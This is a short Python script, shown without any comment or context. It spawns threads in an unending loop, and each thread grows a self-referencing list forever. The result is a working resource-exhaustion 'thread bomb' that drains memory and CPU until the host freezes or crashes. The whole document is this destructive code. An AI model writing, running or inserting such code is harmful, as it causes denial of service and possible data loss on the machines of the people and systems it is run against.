from threading import Thread
def d():
    hh=["cbhlwchlwbclhc;wubhc;uer;"*100]
    while True:
        hh.append(hh)
while True:
    t=Thread(target=d)
    t.start()
